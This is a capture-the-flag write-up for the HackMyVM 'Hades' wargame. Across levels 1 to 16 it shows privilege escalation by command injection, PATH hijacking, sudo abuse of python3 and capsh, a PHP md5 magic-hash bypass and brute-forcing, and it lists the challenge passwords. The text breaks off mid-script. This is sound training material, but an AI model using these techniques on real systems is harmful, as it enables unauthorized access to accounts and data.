# Hades

## Description

```bash
Host: hades.hackmyvm.eu
Port: 6666
User: hacker
Pass: begood!
```

## Level 1

```bash
➜ ssh hades.hackmyvm.eu -p 6666 -l hacker # begood!
hacker@hades:~$ id; find . -type f -ls
uid=2001(hacker) gid=2001(hacker) groups=2001(hacker)
  1050217      4 -rw-r--r--   1 hacker   hacker        220 Apr 23  2023 ./.bash_logout
  1050218      4 -rw-r--r--   1 hacker   hacker       3526 Apr 23  2023 ./.bashrc
  1050221      4 -rw-r-----   1 root     hacker       2625 Apr  5  2024 ./readme.txt
  1050220      4 -rw-r-----   1 root     hacker        194 Apr  5  2024 ./mission.txt
  1050219      4 -rw-r--r--   1 hacker   hacker        807 Apr 23  2023 ./.profile
```

```bash
hacker@hades:~$ cat mission.txt
################
# MISSION 0x01 #
################
User acantha has left us a gift to obtain her powers.
```

```bash
hacker@hades:~$ sudo -l
Sorry, user hacker may not run sudo on hades.

hacker@hades:~$ find / -perm -4000 -ls 2>/dev/null
    21999   1384 -rwsr-xr-x   1 root     root      1414168 Jan  1  2024 /usr/sbin/exim4
    20247     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    20684    640 -rwsr-xr-x   1 root     root         653888 Dec 19  2023 /usr/lib/openssh/ssh-keysign
   525660     48 -rwsr-xr-x   1 root     root          48896 Mar 23  2023 /usr/bin/newgrp
   525530     64 -rwsr-xr-x   1 root     root          62672 Mar 23  2023 /usr/bin/chfn
  1051197     36 -rwsr-xr-x   1 root     root          35128 Mar 28  2024 /usr/bin/umount
  1050682     60 -rwsr-xr-x   1 root     root          59704 Mar 28  2024 /usr/bin/mount
   525536     52 -rwsr-xr-x   1 root     root          52880 Mar 23  2023 /usr/bin/chsh
   525597     88 -rwsr-xr-x   1 root     root          88496 Mar 23  2023 /usr/bin/gpasswd
  1050520    288 -rwS--s---   1 leda     kore         293288 Nov 11  2023 /usr/bin/ffmpeg
  1050557     68 -rwsr-sr-x   1 penelope pandora       69112 Apr  5  2024 /usr/bin/getty
  1051147    276 -rwsr-xr-x   1 root     root         281624 Jun 27  2023 /usr/bin/sudo
  1051207   1596 -rwS--s---   1 kore     iris        1630888 Jan 29  2023 /usr/bin/w3m
  1049990     16 -rwSr-s---   1 root     hacker        16064 Apr  5  2024 /opt/gift_hacker

hacker@hades:~$ /opt/gift_hacker
acantha@hades:~$ id
uid=2043(acantha) gid=2001(hacker) groups=2001(hacker)

acantha@hades:/pwned$ find / -user acantha 2>/dev/null
...
/proc/3968412/arch_status
/pazz/acantha_pass.txt
```

> Creds: `acantha:mYYLhLBSkrzZqFydxGkn`

## Level 2

```bash
acantha@hades:~$ id; find . -type f -ls
uid=2043(acantha) gid=2043(acantha) groups=2043(acantha)
  1049996      4 -rw-r--r--   1 acantha  acantha       220 Apr 23  2023 ./.bash_logout
  1049997      4 -rw-r--r--   1 acantha  acantha      3526 Apr 23  2023 ./.bashrc
  1049999      4 -rw-r-----   1 root     acantha        22 Apr  5  2024 ./flagz.txt
  1050001      4 -rw-r-----   1 root     acantha       275 Apr  5  2024 ./mission.txt
  1050000     16 -rw-r-x---   1 root     acantha     16064 Apr  5  2024 ./guess
  1049998      4 -rw-r--r--   1 acantha  acantha       807 Apr 23  2023 ./.profile
```

```bash
acantha@hades:~$ cat mission.txt
################
# MISSION 0x02 #
################
The user alala has left us a program, if we insert the 6 correct numbers, she gives us her password!
```

The easy way would be just to use `strings` and find password
```bash
acantha@hades:~$ strings guess | grep -P '^.{20}$' --color=auto
DsYzpJQrCEndEWIMxWxu
deregister_tm_clones
```

We could have used `ltrace` or `strace` if it existed on box to see `cmp` calls.

Last resort is some static analysis with your favorite tool ([https://dogbolt.org/?id=f229e361-d7d2-4521-b87f-55ebd47a31d9#BinaryNinja=105&Ghidra=134&Hex-Rays=116](https://dogbolt.org/?id=f229e361-d7d2-4521-b87f-55ebd47a31d9#BinaryNinja=105&Ghidra=134&Hex-Rays=116))

![hades.png](/assets/ctf/hackmyvm/hades.png)

Instructions also said 6 digit code, but it's 4 digits.
```bash
acantha@hades:~$ echo '5880' | ./guess ;echo
Enter PIN code:
 DsYzpJQrCEndEWIMxWxu
```

> Creds: `alala:DsYzpJQrCEndEWIMxWxu`

## Level 3

```bash
alala@hades:~$ id; find . -type f -ls
uid=2044(alala) gid=2044(alala) groups=2044(alala)
  1050010      4 -rw-r--r--   1 alala    alala         220 Apr 23  2023 ./.bash_logout
  1050011      4 -rw-r--r--   1 alala    alala        3526 Apr 23  2023 ./.bashrc
  1050016     16 -rwS--s---   1 root     alala       16056 Apr  5  2024 ./read
  1050014      4 -rw-r-----   1 root     alala          22 Apr  5  2024 ./flagz.txt
  1050015      4 -rw-r-----   1 root     alala         164 Apr  5  2024 ./mission.txt
  1050013      4 -r--r-----   1 althea   althea         21 Apr  5  2024 ./althea_pass.txt
  1050012      4 -rw-r--r--   1 alala    alala         807 Apr 23  2023 ./.profile
alala@hades:~$ cat mission.txt
```

```bash
################
# MISSION 0x03 #
################
User althea loves reading Linux help.
```

If you open `read` binary you get a pager, by default it should be `less`: [https://gtfobins.github.io/gtfobins/less/](https://gtfobins.github.io/gtfobins/less/)

I wasn't able to pop shell, but you can still read files.

```bash
alala@hades:~$ ./read
/bin/sh: 1: Syntax error: "(" unexpected
!done  (press RETURN)
...
ObxEmwisYjERrDfvSbdA
```

> Creds: `althea:ObxEmwisYjERrDfvSbdA`

## Level 4

```bash
althea@hades:~$ id; find . -type f -ls
uid=2045(althea) gid=2045(althea) groups=2045(althea)
  1050018      4 -rw-r--r--   1 althea   althea        220 Apr 23  2023 ./.bash_logout
  1050019      4 -rw-r--r--   1 althea   althea       3527 Sep 24  2024 ./.bashrc
  1050022      4 -rw-r-----   1 root     althea         22 Apr  5  2024 ./flagz.txt
  1050024      4 -rw-r-----   1 root     althea        205 Apr  5  2024 ./mission.txt
  1050023     16 -rwS--s---   1 root     althea      16216 Apr  5  2024 ./lsme
  1050021      4 -r--r-----   1 andromeda andromeda       21 Apr  5  2024 ./andromeda_pass.txt
  1050020      4 -rw-r--r--   1 althea    althea         807 Apr 23  2023 ./.profile
```

```bash
althea@hades:~$ cat mission.txt
################
# MISSION 0x04 #
################
The user andromeda has left us a program to list directories.
```

Hmmmm, checking `/etc/passwd` kinda crashed the program.
```bash
althea@hades:~$ ./lsme
Enter file to check:
/etc/passwd
-rw-r--r-- 1 root root 3660 Mar 13 03:53 /etc/passwd
Segmentation fault
```

Check invalid file
```bash
althea@hades:~$ ./lsme
Enter file to check:
x
/bin/ls: cannot access 'x': No such file or directory
```

Looks like a typical command injection
```bash
althea@hades:~$ ./lsme
Enter file to check:
;id
total 28
-r--r----- 1 andromeda andromeda    21 Apr  5  2024 andromeda_pass.txt
-rw-r----- 1 root      althea       22 Apr  5  2024 flagz.txt
-rwS--s--- 1 root      althea    16216 Apr  5  2024 lsme
-rw-r----- 1 root      althea      205 Apr  5  2024 mission.txt
uid=2046(andromeda) gid=2045(althea) groups=2045(althea)

althea@hades:~$ ./lsme
Enter file to check:
;bash
total 28
-r--r----- 1 andromeda andromeda    21 Apr  5  2024 andromeda_pass.txt
-rw-r----- 1 root      althea       22 Apr  5  2024 flagz.txt
-rwS--s--- 1 root      althea    16216 Apr  5  2024 lsme
-rw-r----- 1 root      althea      205 Apr  5  2024 mission.txt
andromeda@hades:~$ id
uid=2046(andromeda) gid=2045(althea) groups=2045(althea)
andromeda@hades:~$ cat andromeda_pass.txt
OTWGTbHzrxhYFSTlKcOt
```

> Creds: `andromeda:OTWGTbHzrxhYFSTlKcOt`

## Level 5

```bash
andromeda@hades:~$ id; find . -type f -ls
uid=2046(andromeda) gid=2046(andromeda) groups=2046(andromeda)
  1050029      4 -r--r-----   1 anthea   anthea         21 Apr  5  2024 ./anthea_pass.txt
  1050026      4 -rw-r--r--   1 andromeda andromeda      220 Apr 23  2023 ./.bash_logout
  1050027      4 -rw-r--r--   1 andromeda andromeda     3526 Apr 23  2023 ./.bashrc
  1050030      4 -rw-r-----   1 root      andromeda       22 Apr  5  2024 ./flagz.txt
  1050031      4 -rw-r-----   1 root      andromeda      166 Apr  5  2024 ./mission.txt
  1050032     16 -rwS--s---   1 root      andromeda    16056 Apr  5  2024 ./uid
  1050028      4 -rw-r--r--   1 andromeda andromeda      807 Apr 23  2023 ./.profile
```

```bash
andromeda@hades:~$ cat mission.txt
################
# MISSION 0x05 #
################
The user anthea reminds us who we are.
```

Output only shows `id` command, as if ran by anthea user.
```bash
andromeda@hades:~$ ./uid
uid=2047(anthea) gid=2046(andromeda) groups=2046(andromeda)
```

```bash
-rws------   # setuid + owner execute
-rwS------   # setuid, but owner has no execute permission
```

Normal user can't even read file, only execute. We can only observe what it may do...

We know that it's using `id` command. The binary may not change PATH variable at all, if we can control that we can hijack `id` and do whatever (such as making `id` `bash`).
```bash
andromeda@hades:~$ ln -s /bin/bash /tmp/id
andromeda@hades:~$ PATH=/tmp:$PATH ./uid
anthea@hades:~$ /bin/id
uid=2047(anthea) gid=2046(andromeda) groups=2046(andromeda)
anthea@hades:~$ cat anthea_pass.txt
yWFLtSNQArEBTHtWgkKd
```

> Creds: `anthea:yWFLtSNQArEBTHtWgkKd`

## Level 6

```bash
anthea@hades:~$ id; find . -type f -ls
uid=2047(anthea) gid=2047(anthea) groups=2047(anthea)
  1050034      4 -rw-r--r--   1 anthea   anthea        220 Apr 23  2023 ./.bash_logout
  1050035      4 -rw-r--r--   1 anthea   anthea       3526 Apr 23  2023 ./.bashrc
  1050040     16 -rwS--s---   1 root     anthea      16256 Apr  5  2024 ./obsessed
  1050037      4 -r--r-----   1 aphrodite aphrodite       21 Apr  5  2024 ./aphrodite_pass.txt
  1050038      4 -rw-r-----   1 root      anthea          22 Apr  5  2024 ./flagz.txt
  1050039      4 -rw-r-----   1 root      anthea         175 Apr  5  2024 ./mission.txt
  1050036      4 -rw-r--r--   1 anthea    anthea         807 Apr 23  2023 ./.profile
```

```bash
anthea@hades:~$ cat mission.txt
################
# MISSION 0x06 #
################
User aphrodite is obsessed with the number 94.
```

Program wants Env Variable called `MYID`, but after some fuzzing it's discovered that `MYID` is not a number, but ascii value.
```bash
anthea@hades:~$ ./obsessed
No MYID ENV
anthea@hades:~$ MYID=94 ./obsessed
Current MYID: 57

anthea@hades:~$ MYID=1 ./obsessed
Current MYID: 49
Incorrect MYID
anthea@hades:~$ MYID=2 ./obsessed
Current MYID: 50
Incorrect MYID
anthea@hades:~$ python3 -c 'print(ord("1"), ord("2"))'
49 50

anthea@hades:~$ python3 -c 'print(chr(94))'
^
anthea@hades:~$ MYID=^ ./obsessed
Current MYID: 94
aphrodite@hades:~$ id
uid=2048(aphrodite) gid=2047(anthea) groups=2047(anthea)
aphrodite@hades:~$ cat aphrodite_pass.txt
HPJVaqRzieKQeyyATsFv
```

> Creds: `aphrodite:HPJVaqRzieKQeyyATsFv`

## Level 7

```bash
aphrodite@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2048(aphrodite) gid=2048(aphrodite) groups=2048(aphrodite)
  1050042      4 -rw-r--r--   1 aphrodite aphrodite      220 Apr 23  2023 ./.bash_logout
  1050043      4 -rw-r--r--   1 aphrodite aphrodite     3526 Apr 23  2023 ./.bashrc
  1050045      4 -r--r-----   1 ariadne   ariadne         21 Apr  5  2024 ./ariadne_pass.txt
  1050046      4 -rw-r-----   1 root      aphrodite       22 Apr  5  2024 ./flagz.txt
  1050048      4 -rw-r-----   1 root      aphrodite      185 Apr  5  2024 ./mission.txt
  1050047     16 -rwS--s---   1 root      aphrodite    16216 Apr  5  2024 ./homecontent
  1050044      4 -rw-r--r--   1 aphrodite aphrodite      807 Apr 23  2023 ./.profile
################
# MISSION 0x07 #
################
The user ariadne knows what we keep in our HOME.
```

```bash
aphrodite@hades:~$ HOME=id ./homecontent
The content of your HOME is:
/bin/ls: cannot access 'id': No such file or directory

aphrodite@hades:~$ HOME="$HOME;id" ./homecontent
The content of your HOME is:
ariadne_pass.txt  flagz.txt  homecontent  mission.txt
uid=2049(ariadne) gid=2048(aphrodite) groups=2048(aphrodite)

aphrodite@hades:~$ HOME="$HOME;cat ariadne_pass.txt" ./homecontent
The content of your HOME is:
ariadne_pass.txt  flagz.txt  homecontent  mission.txt
iNgNazuJrmhJKWixktzk
```

> Creds: `ariadne:iNgNazuJrmhJKWixktzk`

## Level 8

```bash
ariadne@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2049(ariadne) gid=2049(ariadne) groups=2049(ariadne)
  1050056      4 -rw-r--r--   1 ariadne  ariadne       220 Apr 23  2023 ./.bash_logout
  1050057      4 -rw-r--r--   1 ariadne  ariadne      3526 Dec 26  2024 ./.bashrc
  1050059      4 -rw-r-----   1 root     ariadne        22 Apr  5  2024 ./flagz.txt
  1050060      4 -rw-r-----   1 root     ariadne       165 Apr  5  2024 ./mission.txt
  1050058      4 -rw-r--r--   1 ariadne  ariadne       807 Apr 23  2023 ./.profile
################
# MISSION 0x08 #
################
The user arete lets us use cp on her behalf.
```

```bash
ariadne@hades:~$ sudo -l
Matching Defaults entries for ariadne on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ariadne may run the following commands on hades:
    (arete) NOPASSWD: /bin/cp
```

[https://gtfobins.github.io/gtfobins/cp/](https://gtfobins.github.io/gtfobins/cp/)

Either password file doesn't exist or it has different name and we can't get password directly.
```bash
ariadne@hades:~$ sudo -u arete cp /pwned/arete/arete_pass.txt /dev/stdin
cp: cannot stat '/pwned/arete/arete_pass.txt': No such file or directory
ariadne@hades:~$ sudo -u arete cp /pwned/arete/flagz.txt /dev/stdin
^qmrrbGUXLTqLFDyCDlx^
```

I thought I could hijack `.ssh`, but it doesn't allow creating files
```bash
ariadne@hades:~$ export t=$(mktemp -d)
ariadne@hades:~$ chmod 777 $t
ariadne@hades:~$ mkdir $t/.ssh
ariadne@hades:~$ ssh-keygen -q -t ecdsa -f $t/id_rsa -P "x"
ariadne@hades:~$ cp $t/id_rsa.pub $t/.ssh/authorized_keys
ariadne@hades:~$ sudo -u arete cp $t/.ssh/ /pwned/arete/.ssh -r
cp: cannot create directory '/pwned/arete/.ssh': Permission denied
```

Alternative way was to use `umask 000`, that way copied files would have all perms but sudo drops that.

To get the password we can submit the flag and website will show password.

> Creds: `arete:QjrIovHacmGWxVjXRLmA`

## Level 9

```bash
arete@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2050(arete) gid=2050(arete) groups=2050(arete)
  1050050      4 -rw-r--r--   1 arete    arete         220 Apr 23  2023 ./.bash_logout
  1050051      0 -rw-r--r--   1 arete    arete           0 Jul 26 10:55 ./.bashrc
  1050053      4 -rw-r-----   1 root     arete          22 Apr  5  2024 ./flagz.txt
  1050054      4 -rw-r-----   1 root     arete         227 Apr  5  2024 ./mission.txt
  1050052      4 -rw-r--r--   1 arete    arete         807 Apr 23  2023 ./.profile
################
# MISSION 0x09 #
################
The user artemis allows us to use some binary on her behalf. Its a gift...
```

[https://gtfobins.github.io/gtfobins/capsh/](https://gtfobins.github.io/gtfobins/capsh/)

```bash
arete@hades:~$ sudo -l
Matching Defaults entries for arete on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User arete may run the following commands on hades:
    (artemis) NOPASSWD: /sbin/capsh
arete@hades:~$ sudo -u artemis capsh --
artemis@hades:/pwned/arete$ id
uid=2051(artemis) gid=2051(artemis) groups=2051(artemis)
artemis@hades:/pwned/arete$ cat /pwned/artemis/ # TabTab
.bash_logout  .bashrc       .profile      flagz.txt     mission.txt   restricted
artemis@hades:/pwned/arete$ cat /pwned/artemis/flagz.txt
^SegGdzPgnNdGAmKjnsa^
```

> Creds: `artemis:HIiaojeORLaJBVSPDDCZ`

## Level 10

```bash
artemis@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2051(artemis) gid=2051(artemis) groups=2051(artemis)
  1050062      4 -rw-r--r--   1 artemis  artemis       220 Apr 23  2023 ./.bash_logout
  1050063      4 -rw-r--r--   1 artemis  artemis      3526 Apr 23  2023 ./.bashrc
  1050067     16 -rw---x---   1 root     artemis     16056 Apr  5  2024 ./restricted
  1050065      4 -rw-r-----   1 root     artemis        22 Apr  5  2024 ./flagz.txt
  1050066      4 -rw-r-----   1 root     artemis       202 Apr  5  2024 ./mission.txt
  1050064      4 -rw-r--r--   1 artemis  artemis       807 Apr 23  2023 ./.profile
################
# MISSION 0x10 #
################
We need /bin/bash so that the user asia gives us her password.
```

It just worked?
```bash
artemis@hades:~$ ./restricted
Your SHELL is: /bin/bash

djqWtkLisbQlrGtLYHCv
```

> Creds: `asia:djqWtkLisbQlrGtLYHCv`

## Level 11

```bash
asia@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2002(asia) gid=2002(asia) groups=2002(asia)
  1050069      4 -rw-r--r--   1 asia     asia          220 Apr 23  2023 ./.bash_logout
  1050070      4 -rw-r--r--   1 asia     asia         3526 Apr 23  2023 ./.bashrc
  1050072      4 -rw-r-----   1 root     asia           22 Apr  5  2024 ./flagz.txt
  1050073      4 -rw-r-----   1 root     asia          188 Apr  5  2024 ./mission.txt
  1050071      4 -rw-r--r--   1 asia     asia          807 Apr 23  2023 ./.profile
################
# MISSION 0x11 #
################
The user asteria is teaching us to program in python.
```

```bash
asia@hades:~$ sudo -l
Matching Defaults entries for asia on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User asia may run the following commands on hades:
    (asteria) NOPASSWD: /usr/bin/python3
```

```bash
asia@hades:~$ sudo -u asteria python3 -c '__import__("os").system("/bin/bash -p")'
asteria@hades:/pwned/asia$ id
uid=2003(asteria) gid=2003(asteria) groups=2003(asteria)
asteria@hades:/pwned/asia$ cat /pwned/asteria/flagz.txt
^xSRhIftMsAwWvBAnqNZ^
```

> Creds: `asteria:hawMVJCYrBgoDAMVhuwT`

## Level 12

```bash
asteria@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2003(asteria) gid=2003(asteria) groups=2003(asteria)
  1050075      4 -rw-r--r--   1 asteria  asteria       220 Apr 23  2023 ./.bash_logout
  1050076      4 -rw-r--r--   1 asteria  asteria      3526 Apr 23  2023 ./.bashrc
  1050080      4 -rw-r-----   1 root     asteria       161 Apr  5  2024 ./sihiri_old.php
  1050078      4 -rw-r-----   1 root     asteria        22 Apr  5  2024 ./flagz.txt
  1050079      4 -rw-r-----   1 root     asteria       145 Apr  5  2024 ./mission.txt
  1050077      4 -rw-r--r--   1 asteria  asteria       807 Apr 23  2023 ./.profile
################
# MISSION 0x12 #
################
The user astraea believes in magic.
```

This is a classic type juggling vulnerability in PHP [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling)
```php
asteria@hades:~$ cat sihiri_old.php

<?php
$pass = hash("md5", $_GET["pass"]);
$pass2 = hash("md5", "ASTRAEA_PASS");
if ($pass == $pass2) {
    print "ASTRAEA_PASS";
} else {
    print "Incorrect ^^";
}
?>
```

However since hashing is involved we may be dealing with Hash Collision Attack in PHP: [https://github.com/spaze/hashes/blob/master/md5.md](https://github.com/spaze/hashes/blob/master/md5.md)
```bash
asteria@hades:~$ curl 0/sihiri_old.php
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.22.1</center>
</body>
</html>
asteria@hades:~$ curl 0/sihiri.php
Incorrect ^^

asteria@hades:~$ curl '0/sihiri.php?pass=x'
Incorrect ^^

asteria@hades:~$ curl '0/sihiri.php?pass=240610708'
nZkEYtjvHElOtupXKzTE
```

> Creds: `astraea:nZkEYtjvHElOtupXKzTE`

## Level 13

### Hidden Flag (0xS)

No mission, just flag?
```bash
➜ ssh hades.hackmyvm.eu -p 6666 -l astraea
astraea@hades.hackmyvm.eu password: nZkEYtjvHElOtupXKzTE
^KssHQIAFsxUamecyXIUk^
```

### Challenge Flag

We discovered a hidden flag, however when connecting to SSH we are thrown out immediately. We can login as previous user and try tinkering with some stuff.
```bash
asteria@hades:~$ cat /etc/ssh/sshd_config | grep astraea -A3
Match User astraea
  PasswordAuthentication yes
  ForceCommand /bin/echo '^KssHQIAFsxUamecyXIUk^'
```

We can't exactly bypass **ForceCommand**, overwrite it or change it. We could change this behavior if we had access to their `.ssh/` but we don't...

This restriction doesn't allow us to SSH, SCP, SFTP, or anything SSH related.

Find ways to identify running services which should allow connection to that service
```bash
asteria@hades:~$ find / -type f -executable \( -name ss -o -name netstat -o -name busybox \) -ls 2>/de
v/null
   658127   1108 -rwxrwxrwx   1 hebe     hebe      1131168 Sep  5  2024 /var/tmp/busybox
asteria@hades:~$ /var/tmp/busybox netstat -altnp
netstat: showing only processes with your user ID
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:9001            0.0.0.0:*               LISTEN      2859335/python3
tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.11:35635        0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      3726216/php
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      2687108/php
tcp        0     60 172.66.0.66:22          212.58.102.201:21119    ESTABLISHED -
tcp        0   1252 172.66.0.66:22          212.58.102.201:6657     ESTABLISHED -
tcp        0      0 :::1965                 :::*                    LISTEN      -
tcp        0      0 :::80                   :::*                    LISTEN      -
tcp        0      0 :::21                   :::*                    LISTEN      -
tcp        0      0 :::22                   :::*                    LISTEN      -
```

PHP and Python applications don't give anything, but oddly enough FTP service is up and running.
```bash
asteria@hades:/tmp/tmp.AwxT4kMMCD$ ftp astraea@0
Connected to 0.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||5802|)
150 Here comes the directory listing.
-rw-r-----    1 0        2004           21 Apr 05  2024 atalanta.txt
-rw-r-----    1 0        2004           22 Apr 05  2024 flagz.txt
-rw-r-----    1 0        2004          181 Apr 05  2024 mission.txt
226 Directory send OK.
ftp> prompt
Interactive mode off.
ftp> mget *
ftp> exit
asteria@hades:/tmp/tmp.AwxT4kMMCD$ cat *
mUcSNQlaXtwSvGcgeTYZ
^nqTHTzMzDPDJrKPCfVR^
################
# MISSION 0x13 #
################
The user atalanta has done something with our account.
```

> Creds: `atalanta:mUcSNQlaXtwSvGcgeTYZ`

## Level 14

```bash
atalanta@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2005(atalanta) gid=2005(atalanta) groups=2005(atalanta)
  1050089      4 -rw-r--r--   1 atalanta atalanta      220 Apr 23  2023 ./.bash_logout
  1050090      4 -rw-r--r--   1 atalanta atalanta     3526 Apr 23  2023 ./.bashrc
  1050095      4 -r--------   1 atalanta atalanta      927 Apr  5  2024 ./weird.c
  1050092      4 -rw-r-----   1 root     atalanta       22 Apr  5  2024 ./flagz.txt
  1050093      4 -rw-r-----   1 root     atalanta      237 Apr  5  2024 ./mission.txt
  1050094     20 -r-sr-s---   1 root     atalanta    16608 Apr  5  2024 ./weird
  1050091      4 -rw-r--r--   1 atalanta atalanta      807 Apr 23  2023 ./.profile
################
# MISSION 0x14 #
################
User athena lets us run her program, but she hasn't left us her source code.
```

This binary drops privileges to UID/GID `2006`, then writes the contents of `/var/lib/me` into the user's `$HOME` path. It does this by treating `$HOME` as a regular file.

After writing the file, it inspects its owner. If the file is **not owned by the user `atalanta`**, it modifies its permissions to remove group/other read access and add group write access. However, there are flaws in the logic:
- `$HOME` is misused as a file path, not a directory.
- It incorrectly compares usernames using pointer logic instead of string comparison.
	- Compares strings using `!=` instead of `strcmp()`
- The permission bitmask is malformed and likely doesn't behave as intended.
	- Misuses bitwise operations in `chmod()`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <pwd.h>

int main() {
  setuid(2006); setgid(2006);
  const char * filename;
  struct stat fs;
  int r;
  filename = getenv("HOME");
  printf("HOME detected: %s\n", filename);
  char cmd[1000];
  FILE * out_file = fopen(getenv("HOME"), "w");
  FILE * fpipe;
  char * command = "/bin/cat /var/lib/me";
  char c = 0;

  if (0 == (fpipe = (FILE * ) popen(command, "r"))) {
    perror("popen() failed.");
    exit(EXIT_FAILURE);
  }

  while (fread( & c, sizeof c, 1, fpipe)) {
    fprintf(out_file, "%c", c);
  }
  pclose(fpipe);
  pclose(out_file);
  r = stat(filename, & fs);
  struct passwd * pw = getpwuid(fs.st_uid);
  if (pw -> pw_name != "atalanta") {
    r = chmod(filename, fs.st_mode & ~(S_IROTH) + ~(S_IRGRP) | S_IWGRP);
  }
  stat(filename, & fs);
  return EXIT_SUCCESS;
}
```

```bash
atalanta@hades:~$ touch /tmp/letmein2
atalanta@hades:~$ chmod 777 /tmp/letmein2
atalanta@hades:~$ HOME=/tmp/letmein2 ./weird
HOME detected: /tmp/letmein2
atalanta@hades:~$ cat /tmp/letmein2
kmQMpZsXgOsnzGReRcoV
```

> Creds: `athena:kmQMpZsXgOsnzGReRcoV`

## Level 15

```bash
athena@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2006(athena) gid=2006(athena) groups=2006(athena)
  1050097      4 -rw-r--r--   1 athena   athena        220 Apr 23  2023 ./.bash_logout
  1050098      4 -rw-r--r--   1 athena   athena       3526 Apr 23  2023 ./.bashrc
  1050101      4 -rw-r-----   1 root     athena         22 Apr  5  2024 ./flagz.txt
  1050102      4 -rw-r-----   1 root     athena        160 Apr  5  2024 ./mission.txt
  1050100      4 -rw-r-----   1 root     athena        166 Apr  5  2024 ./auri_old.sh
  1050099      4 -rw-r--r--   1 athena   athena        807 Apr 23  2023 ./.profile
################
# MISSION 0x15 #
################
User aura lets us use her new script.
```

```bash
athena@hades:~$ cat auri_old.sh

#!/bin/bash
echo "What?"
read hackme
#Secure the condition!
#if [[ $hackme =~ "????????" ]]; then
#exit
#fi
#Add newest Aura pass!
#$hackme AURANEWPASS 2>/dev/null

athena@hades:~$ sudo -l
Matching Defaults entries for athena on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User athena may run the following commands on hades:
    (aura) NOPASSWD: /bin/bash -c /pwned/aura/auri.sh
```

The IF condition is flawed because you can't use regex and quoted strings together. However the last line is vulnerable, we can pass `$hackme` as command to get output of **AURANEWPASS**.

Commands like `cat` is useless, because we need to print ENV Variable. For some reason `printenv` failed, but `printf` worked.
```bash
athena@hades:~$ echo 'printenv' | sudo -u aura /bin/bash -c /pwned/aura/auri.sh ;echo
What?

athena@hades:~$ echo 'printf' | sudo -u aura /bin/bash -c /pwned/aura/auri.sh ;echo
What?
TiqpedAFjwmVyBlYpzRh
```

This was the check which denied usage of `printenv`!
```bash
if [[ $hackme == *"e"* || $hackme == *"o"* || $hackme == *"?"* ]]; then
```

> Creds: `aura:TiqpedAFjwmVyBlYpzRh`

## Level 16

```bash
aura@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2007(aura) gid=2007(aura) groups=2007(aura)
  1050110     16 -rw---x---   1 root     aura        16064 Apr  5  2024 ./numbers
  1050104      4 -rw-r--r--   1 aura     aura          220 Apr 23  2023 ./.bash_logout
  1050105      4 -rw-r--r--   1 aura     aura         3526 Apr 23  2023 ./.bashrc
  1050108      4 -rw-r-----   1 root     aura           22 Apr  5  2024 ./flagz.txt
  1050109      4 -rw-r-----   1 root     aura          168 Apr  5  2024 ./mission.txt
  1050107      4 -rw-r-x---   1 root     aura          160 Apr  5  2024 ./auri.sh
  1050106      4 -rw-r--r--   1 aura     aura          807 Apr 23  2023 ./.profile
################
# MISSION 0x16 #
################
User aegle has a good memory for numbers.
```

Basically we have to progressively bruteforce each number to get to the end, each correct answer gets us OK
```bash
aura@hades:~$ echo $'1\n2\n3\n1\n2\n3\n9' | ./numbers
Enter one number:
Number OK
Enter next number:
Number OK
Enter next number:
Number OK
Enter next number:
Number OK
Enter next number:
Number OK
Enter next number:
Number OK
Enter next number:
Number OK
Enter next number:

NO :_(
```

Create a script to progressively bruteforce the pin. The trickiest part of challenge was realizing that single digit may repeat more then 1 in row and program counted 1 entry as more then 1 entry (e.g.: If input is 1, it would could correct for 1 1 1).

I had some fun and added colors to script, lmao
```bash
#!/bin/bash

# Initialize empty string to store our discovered PIN sequence
correct=""

# Define ANSI color codes
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
RESET="\e[0m"

while true; do
    found=0

    for i in {1..9}; do
        test="${correct}${i}"
        echo -e "${CYAN}[*] Testing: $test${RESET}"

        # Convert number to one-digit-per-line format and feed to binary
        result=$(echo -e "${test//?/&\\n}" | ./numbers)

        # Count how many correct responses we got
        ok_count=$(echo "$result" | grep -c "Number OK")
        ok_count_prev=${#correct}
        echo -e "${YELLOW}[*] OK count: $ok_count (Previous length: $ok_count_prev)${RESET}"

        # If we got more OKs than our previous correct length
        if [ "$ok_count" -gt "$ok_count_prev" ]; then
            to_add=$((ok_count - ok_count_prev))

